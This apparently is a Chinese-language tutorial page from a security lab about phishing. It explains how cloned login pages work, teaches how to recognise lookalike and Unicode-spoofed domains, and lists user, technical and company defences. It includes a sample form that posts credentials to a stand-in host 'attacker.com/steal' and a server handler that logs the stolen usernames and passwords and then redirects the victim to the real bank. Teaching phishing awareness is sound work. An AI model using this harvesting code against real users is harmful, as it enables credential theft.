# 钓鱼攻击

钓鱼攻击通过伪造可信网站，诱骗用户输入敏感信息（如账号密码、银行卡号）。

## 攻击原理

1. 攻击者创建与目标网站高度相似的假网站
2. 通过邮件、短信、社交媒体传播钓鱼链接
3. 用户误以为是真实网站，输入敏感信息
4. 信息被发送到攻击者服务器

## 实验一：仿冒登录页

### 攻击场景

攻击者复制银行登录页面，修改表单提交地址。

### 真实页面 vs 钓鱼页面

| 特征 | 真实页面 | 钓鱼页面 |
|------|----------|----------|
| 域名 | bank.com | bank-secure.com |
| HTTPS | ✅ 有效证书 | ❌ 无证书或自签名 |
| 表单提交 | 提交到官方服务器 | 提交到攻击者服务器 |

### 钓鱼页面代码

```html
<!-- 看起来一模一样，但提交到攻击者服务器 -->
<form action="https://attacker.com/steal" method="POST">
  <input name="username" placeholder="用户名">
  <input name="password" type="password" placeholder="密码">
  <button>登录</button>
</form>
```

## 实验二：凭证窃取

### 攻击者视角

攻击者服务器接收并记录所有提交的凭证：

```javascript
app.post('/steal', (req, res) => {
  const { username, password } = req.body
  // 记录窃取的凭证
  console.log(`[STOLEN] ${username}:${password}`)
  // 重定向到真实网站，降低用户警觉
  res.redirect('https://real-bank.com')
})
```

### 攻击流程

```
用户点击钓鱼链接
    ↓
看到"银行登录页"
    ↓
输入账号密码
    ↓
凭证发送到攻击者
    ↓
重定向到真实银行（用户无感知）
```

## 实验三：识别钓鱼网站

### 检查要点

1. **URL 检查**
   - 域名是否正确？
   - 是否有多余字符？（bank-login.com vs bank.com）
   - 是否使用 HTTPS？

2. **证书检查**
   - 点击地址栏锁图标
   - 查看证书颁发机构
   - 确认证书有效期

3. **页面细节**
   - 是否有拼写错误？
   - 图片是否模糊？
   - 链接是否指向正确域名？

### 常见钓鱼手法

| 手法 | 示例 |
|------|------|
| 相似域名 | g00gle.com (0代替o) |
| 子域名欺骗 | bank.com.attacker.com |
| Unicode 欺骗 | bаnk.com (а是西里尔字母) |
| 短链接 | bit.ly/xxx |

## 防御措施

### 用户层面

- 不点击可疑链接
- 手动输入网址
- 检查 URL 和证书
- 启用双因素认证

### 技术层面

```javascript
// 1. 实施 CSP
Content-Security-Policy: frame-ancestors 'none'

// 2. 添加 X-Frame-Options
X-Frame-Options: DENY

// 3. 使用 SameSite Cookie
Set-Cookie: session=xxx; SameSite=Strict
```

### 企业层面

- 安全意识培训
- 邮件网关过滤
- 域名监控
- 钓鱼演练

## 开始实验

访问 [钓鱼攻击实验](/labs/phishing) 学习识别钓鱼网站。
